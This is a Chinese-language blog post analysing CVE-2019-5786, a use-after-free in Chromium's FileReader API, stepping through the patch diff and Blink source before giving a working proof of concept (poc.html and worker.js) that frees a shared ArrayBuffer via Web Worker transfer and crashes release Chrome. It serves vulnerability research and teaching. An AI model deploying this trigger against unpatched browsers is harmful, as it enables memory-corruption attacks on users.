<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>CVE-2019-5786 | V1NKe的心情垃圾桶</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="Chromium," />
  

  <meta name="description" content="DOM BUG">
<meta name="keywords" content="FileReader">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-5786">
<meta property="og:url" content="http://yoursite.com/2019/07/27/CVE-2019-5786/index.html">
<meta property="og:site_name" content="V1NKe的心情垃圾桶">
<meta property="og:description" content="DOM BUG">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/CVE-2019-5786/1564383007.jpg">
<meta property="og:image" content="http://yoursite.com/CVE-2019-5786/1564384973.jpg">
<meta property="og:image" content="http://yoursite.com/CVE-2019-5786/1564385749.jpg">
<meta property="og:updated_time" content="2019-09-23T08:03:18.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2019-5786">
<meta name="twitter:description" content="DOM BUG">
<meta name="twitter:image" content="http://yoursite.com/CVE-2019-5786/1564383007.jpg">

  

  
    <link rel="icon" href="/haimian.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            关于
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析："><span class="toc-text">分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FileReader："><span class="toc-text">FileReader：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC："><span class="toc-text">POC：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch："><span class="toc-text">Patch：</span></a></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-CVE-2019-5786" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">CVE-2019-5786</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2019.07.27</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>V1NKe</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>一个在<code>FileReader Web API</code>上发现的<code>UAF</code>洞。</p>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>先看<code>diff</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  if (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    return nullptr;</span><br><span class="line"></span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  if (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    AdjustReportedMemoryUsageToV8(</span><br><span class="line">        -1 * static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">    raw_data_.reset();</span><br><span class="line">  if (!finished_loading_) &#123;</span><br><span class="line">    return DOMArrayBuffer::Create(</span><br><span class="line">        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line"></span><br><span class="line">  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  AdjustReportedMemoryUsageToV8(-1 *</span><br><span class="line">                                static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">  raw_data_.reset();</span><br><span class="line">  return array_buffer_result_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String FileReaderLoader::StringResult() &#123;</span><br></pre></td></tr></table></figure>
<p>不同点就在于，<code>result</code>返回值有变化，原版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br></pre></td></tr></table></figure>
<p>新版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return DOMArrayBuffer::Create(ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br></pre></td></tr></table></figure>
<p>根据代码可以猜测该变化是在<code>ArrayBuffer</code>的分配上。所以我们往此方向分析即可。并且还有一个变化是对<code>finished_loading_</code>状态改变，这个暂时还不清楚作用是什么，先往后看看。</p>
<h4 id="FileReader："><a href="#FileReader：" class="headerlink" title="FileReader："></a>FileReader：</h4><p><code>FileReader</code> 对象允许Web应用程序异步读取存储在用户计算机上的文件（或原始数据缓冲区）的内容，使用 <code>File</code> 或 <code>Blob</code>对象指定要读取的文件或数据。</p>
<p>简单来说就是平时在网页上所看见的上传本地文件的一个<code>Web API</code>。</p>
<p>它的属性：</p>
<p><code>FileReader.readyState</code> （只读）</p>
<p>表示<code>FileReader</code>状态的数字。取值如下：</p>
<table>
<thead>
<tr>
<th>常量名</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>EMPTY</code></td>
<td><code>0</code></td>
<td>还没有加载任何数据.</td>
</tr>
<tr>
<td><code>LOADING</code></td>
<td><code>1</code></td>
<td>数据正在被加载.</td>
</tr>
<tr>
<td><code>DONE</code></td>
<td><code>2</code></td>
<td>已完成全部的读取请求.</td>
</tr>
</tbody>
</table>
<p>三种状态。</p>
<p><code>FileReader.result</code> （只读）：</p>
<p>文件的内容。该属性仅在读取操作完成后才有效，数据的格式取决于使用哪个方法来启动读取操作。</p>
<p><code>result</code>表示从文件中读取的数据。</p>
<p>文件读取方法有这么四种：</p>
<ol>
<li><code>FileReader.readAsArrayBuffer()</code></li>
<li><code>FileReader.readAsBinaryString()</code></li>
<li><code>FileReader.readAsDataURL()</code></li>
<li><code>FileReader.readAsText()</code></li>
</ol>
<p>根据上面所看的<code>diff</code>变化是在<code>ArrayBuffer</code>上我们可以想到用的是第一种方式读取文件数据。</p>
<p>事件处理上还有这么几个：</p>
<ol>
<li><code>FileReader.onloadend</code>（该事件在读取操作结束时（要么成功，要么失败）触发）</li>
<li><code>FileReader.onprogress</code>（该事件在读取数据时触发）</li>
</ol>
<p>接下来就可以开始往代码入手来分析了。先从老版本开始入手。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br></pre></td></tr></table></figure>
<p>在网页版的chromium源代码上我们可以快速查看各个引用。</p>
<p>先找到<code>DOMArrayBuffer::Create</code>的具体函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* DOMArrayBuffer::Create(</span><br><span class="line">    scoped_refptr&lt;SharedBuffer&gt; shared_buffer) &#123;</span><br><span class="line">  WTF::ArrayBufferContents contents(shared_buffer-&gt;size(), 1,</span><br><span class="line">                                    WTF::ArrayBufferContents::kNotShared,</span><br><span class="line">                                    WTF::ArrayBufferContents::kDontInitialize);</span><br><span class="line">  uint8_t* data = static_cast&lt;uint8_t*&gt;(contents.Data());</span><br><span class="line">  if (UNLIKELY(!data))</span><br><span class="line">    OOM_CRASH();</span><br><span class="line"></span><br><span class="line">  for (const auto&amp; span : *shared_buffer) &#123;</span><br><span class="line">    memcpy(data, span.data(), span.size());</span><br><span class="line">    data += span.size();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>scoped_refptr</code>作为表示智能指针，一般用于引用计数。</p>
<p>此函数可以大致看出是拿来申请<code>DOMArrayBuffer</code>空间的一个函数，<code>DOMArrayBuffer</code>和<code>ArrayBuffer</code>不同，前者有着自己的内存管理方式，也就是<code>partationAlloc</code>内存管理，主要用于<code>Blink</code>即渲染器上的内存分配问题。而且该内存管理有着明显的区域划分规则，不同类别的区域块是不能复用的，互不相干的。所以具有着较强的安全性。具体的就不多说。</p>
<p>再看看<code>raw_data_</code>的定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;ArrayBufferBuilder&gt; raw_data_;</span><br></pre></td></tr></table></figure>
<p><code>unique_ptr</code>也是一个智能指针，不过是独占式。因为他是<code>ArrayBufferBuilder</code>的指针，所以在去查看<code>ArrayBufferBuilder</code>的定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBufferBuilder::ToArrayBuffer() &#123;</span><br><span class="line">  // Fully used. Return m_buffer as-is.</span><br><span class="line">  if (buffer_-&gt;ByteLength() == bytes_used_)</span><br><span class="line">    return buffer_;</span><br><span class="line"></span><br><span class="line">  return buffer_-&gt;Slice(0, bytes_used_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned bytes_used_;</span><br><span class="line">scoped_refptr&lt;ArrayBuffer&gt; buffer_;</span><br></pre></td></tr></table></figure>
<p>有了<code>ToArrayBuffer</code>函数就好分析了，看上面的代码，如果申请的大小和最先定义申请的<code>ArrayBuffer</code>空间大小相同，那么便直接返回该空间指针。如果不同，则从该<code>ArrayBuffer</code>中切一块，大小为申请的大小，再返回该空间指针。因为不管什么情况，指针指向的都为同一块空间。所以当两个不同的对象指向同一块内存空间的时候，就会引发<code>UAF</code>。所以我们再来看看新版本的改动的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer::Create(ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br></pre></td></tr></table></figure>
<p>看一下<code>ArrayBuffer::Create</code>的定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Create(const void* source,</span><br><span class="line">                                               size_t byte_length) &#123;</span><br><span class="line">  ArrayBufferContents contents(byte_length, 1, ArrayBufferContents::kNotShared,</span><br><span class="line">                               ArrayBufferContents::kDontInitialize);</span><br><span class="line">  if (UNLIKELY(!contents.Data()))</span><br><span class="line">    OOM_CRASH();</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer = base::AdoptRef(new ArrayBuffer(contents));</span><br><span class="line">  memcpy(buffer-&gt;Data(), source, byte_length);</span><br><span class="line">  return buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数可以看出是申请一块内存，把参数中的原数据复制到申请的内存块上，再返回指向该内存的一个指针。再看看该函数的参数定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const void* Data() const &#123; return buffer_-&gt;Data(); &#125;</span><br><span class="line"></span><br><span class="line">unsigned ByteLength() const &#123; return bytes_used_; &#125;</span><br></pre></td></tr></table></figure>
<p>所以这两个参数含义就是所申请空间上的数据以及数据长度的值。</p>
<p>所以我们可以区分出<code>patch</code>前后的区别：</p>
<p>旧版本是在读取文件数据时，读取的整个过程中返回的<code>ArrayBuffer</code>都是同一块。</p>
<p>新版本是在文件没有读取完时，返回的都是不同块。</p>
<p>现在再来看<code>finished_loading_</code>的定义，初始值为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool finished_loading_ = false;</span><br></pre></td></tr></table></figure>
<p>在此函数中，它的值会变<code>true</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void FileReaderLoader::OnFinishLoading() &#123;</span><br><span class="line">  if (read_type_ != kReadByClient &amp;&amp; raw_data_) &#123;</span><br><span class="line">    raw_data_-&gt;ShrinkToFit();</span><br><span class="line">    is_raw_data_converted_ = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  finished_loading_ = true;              //become true</span><br><span class="line"></span><br><span class="line">  Cleanup();</span><br><span class="line">  if (client_)</span><br><span class="line">    client_-&gt;DidFinishLoading();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在下面两个函数中，才会调用上面的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void FileReaderLoader::OnComplete(int32_t status, uint64_t data_length) &#123;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line"></span><br><span class="line">  if (data_length != total_bytes_) &#123;</span><br><span class="line">    Failed(FileErrorCode::kNotReadableErr, FailureType::kReadSizesIncorrect);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  received_on_complete_ = true;</span><br><span class="line">  if (received_all_data_)</span><br><span class="line">    OnFinishLoading();                  //tigger</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void FileReaderLoader::OnDataPipeReadable(MojoResult result) &#123;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line"></span><br><span class="line">    consumer_handle_-&gt;EndReadData(num_bytes);</span><br><span class="line">    if (BytesLoaded() &gt;= total_bytes_) &#123;</span><br><span class="line">      received_all_data_ = true;</span><br><span class="line">      if (received_on_complete_)</span><br><span class="line">        OnFinishLoading();              //tigger</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当<code>received_all_data_</code>为真时，执行<code>OnFinishLoading</code>，或者当<code>received_on_complete_</code>为真时。根据变量名我们可以猜测出，当接收完所有数据时，<code>finished_loading_</code>为<code>true</code>。即读取文件数据读取完全时，为真。</p>
<p>所以当我们再来看旧版本代码时，一切都会变得很明了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());	</span><br><span class="line">if (finished_loading_) &#123;	</span><br><span class="line">  array_buffer_result_ = result;</span><br><span class="line">  AdjustReportedMemoryUsageToV8(	</span><br><span class="line">      -1 * static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));	</span><br><span class="line">  raw_data_.reset();	</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure>
<p>文件数据没有读取完全时和读取完后，返回的都是指向同一个<code>ArrayBuffer-backing_store</code>的指针。只不过大小不同。那么，这就有了两个不同的对象指向同一个内存空间的情况，可引发<code>UAF</code>。</p>
<p>我们可以写一个样例来看看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function onprogress(e)&#123;</span><br><span class="line">	console.log(e.target.result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function load_end(e)&#123;</span><br><span class="line">	console.log(e.target.result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()&#123;</span><br><span class="line">	var filereader = new FileReader();</span><br><span class="line">	var str = &apos;A&apos;;</span><br><span class="line">	str = str.repeat(100000000);</span><br><span class="line">	var file = new Blob([str]);</span><br><span class="line">	filereader.onload = load_end;</span><br><span class="line">	filereader.onprogress = onprogress;</span><br><span class="line">	filereader.readAsArrayBuffer(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="/CVE-2019-5786/1564383007.jpg" alt="1564383007(1)"></p>
<p>可以看见<code>onprogress</code>事件被触发多次。但是最终的<code>ArrayBuffer</code>大小两个事件得到的都一样，即两个不同的<code>ArrayBuffer</code>对象共用了同一块的<code>backing_store</code>空间。说明可以有机会构造出<code>UAF</code>。</p>
<p>但是得到了两个指针后，该怎么利用又是一个问题。</p>
<p>因为<code>JS</code>中没有主动释放<code>ArrayBuffer</code>的函数，所以我们没有办法主动去释放其中一个指针。而且之前从代码中我们也可以看见，源代码中对<code>buff</code>使用的是智能指针，且用了<strong>引用计数</strong>的方式，来对<code>buff</code>进行智能的释放。</p>
<p>现在的情况是我们所得到的一块<code>buff</code>内存上有两个引用指针，即使释放了其中一个指针的引用，我们也还剩一个引用，根据引用计数的原则：当引用个数为0时，对象才会被回收。所以当我们释放一个指针时，也无法释放该内存，因此也无法产生<code>UAF</code>。</p>
<p>那么我们该怎么做呢？</p>
<p>这里有两种方式释放内存。一种是利用<code>Web Worker</code>，一种是<code>WebAudio</code>。</p>
<p>两种方式都是通过转移<code>ArrayBuffer</code>来释放底层的堆块，这种方式称作<code>neuter</code>。</p>
<p>这里就介绍第一种：</p>
<p><code>Web Worker</code>通过<code>postMessage</code>和<code>onmessage</code>来发送接收消息。当发送出去的为<code>ArrayBuffer</code>时，就能够实现<code>ArrayBuffer</code>的转移，从而释放堆块。</p>
<p><code>postMessage</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(message, [transfer]);</span><br></pre></td></tr></table></figure>
<p>message 表示要传递的数据。<code>transfer</code>是可转移对象，可转移对象是如<code>ArrayBuffer</code>，<code>MessagePort</code>或<code>ImageBitmap</code>的实例对象，可以以数组元素的方式放到第二个参数中，以提高传递效率，但是在第一个参数中需要指定一个引用，以方便目标线程接收。</p>
<p>这里有一个小例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var myWorker = new Worker(&apos;./worker.js&apos;);</span><br><span class="line">var buff = new ArrayBuffer(0x100);</span><br><span class="line">console.log(buff.byteLength);</span><br><span class="line">myWorker.postMessage(buff,[buff]);</span><br><span class="line">console.log(buff.byteLength);</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="/CVE-2019-5786/1564384973.jpg" alt="1564384973(1)"></p>
<p>可以看见该<code>ArrayBuffer</code>已经被转移了，已被释放。那么接下来就好构造<code>poc</code>了。</p>
<h3 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h3><p><code>poc.html</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;v1nke&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">var pro_buff;</span><br><span class="line">var load_buff;</span><br><span class="line"></span><br><span class="line">function onprogress(e)&#123;</span><br><span class="line">	var buff = e.target.result;</span><br><span class="line">	if(pro_buff.byteLength != 10000000)&#123;</span><br><span class="line">		pro_buff = buff;</span><br><span class="line">		console.log(pro_buff);</span><br><span class="line">	&#125;</span><br><span class="line">	//pro_buff = buff;</span><br><span class="line">	//console.log(pro_buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function load_end(e)&#123;</span><br><span class="line">	var buff = e.target.result;</span><br><span class="line">	load_buff = buff;</span><br><span class="line">	if(pro_buff != load_buff &amp;&amp; </span><br><span class="line">		pro_buff.byteLength == load_buff.byteLength)&#123;</span><br><span class="line">		console.log(&apos;success!&apos;);</span><br><span class="line">		poc();</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		console.log(&apos;same buff&apos;);</span><br><span class="line">		main();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function poc()&#123;</span><br><span class="line">	var worker = new Worker(&apos;./worker.js&apos;);</span><br><span class="line">	var dataview1 = new DataView(pro_buff);</span><br><span class="line">	var dataview2 = new DataView(load_buff);</span><br><span class="line"></span><br><span class="line">	dataview1.setUint32(0,0x41414141);</span><br><span class="line"></span><br><span class="line">	worker.postMessage(pro_buff,[pro_buff]);</span><br><span class="line">	console.log(load_buff);</span><br><span class="line">	console.log(dataview2.getUint32(0));</span><br><span class="line">	worker.postMessage(load_buff,[load_buff]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()&#123;</span><br><span class="line">	var filereader = new FileReader();</span><br><span class="line"></span><br><span class="line">	pro_buff = load_buff = new ArrayBuffer(0);</span><br><span class="line"></span><br><span class="line">	var input_str = &quot;A&quot;;</span><br><span class="line">	input_str = input_str.repeat(10000000);</span><br><span class="line">	var file = new Blob([input_str]);</span><br><span class="line"></span><br><span class="line">	filereader.onprogress = onprogress;</span><br><span class="line">	filereader.onloadend = load_end;</span><br><span class="line">	filereader.readAsArrayBuffer(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><code>worker.js</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmessage = function(e)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<p><img src="/CVE-2019-5786/1564385749.jpg" alt="1564385749(1)"></p>
<p>如果运行在发行版本的<code>Chrome</code>上，那么会直接<code>crash</code>。</p>
<h3 id="Patch："><a href="#Patch：" class="headerlink" title="Patch："></a>Patch：</h3><p>此时再回过头来看补丁：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  if (!finished_loading_) &#123;</span><br><span class="line">    return DOMArrayBuffer::Create(</span><br><span class="line">        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  AdjustReportedMemoryUsageToV8(-1 *</span><br><span class="line">                                static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">  raw_data_.reset();</span><br><span class="line">  return array_buffer_result_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加上了在没有读取完全文件数据时，返回的是读取文件的副本<code>ArrayBuffer</code>内存空间，因此不会产生共用同一块内存空间的情况，也就预防了<code>UAF</code>的产生。</p>

    
  </div>

  
      <div class="git"></div>
  

</article>


   
  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">扫一扫，支持v1nke</div>
        <ul>
        
          <li class="item">
            <span>微信扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
          <li class="item">
            <span>支付宝扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>


   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2019/06/08/v8-OOB-*CTF/">
        <i class="icon icon-angle-left"></i>
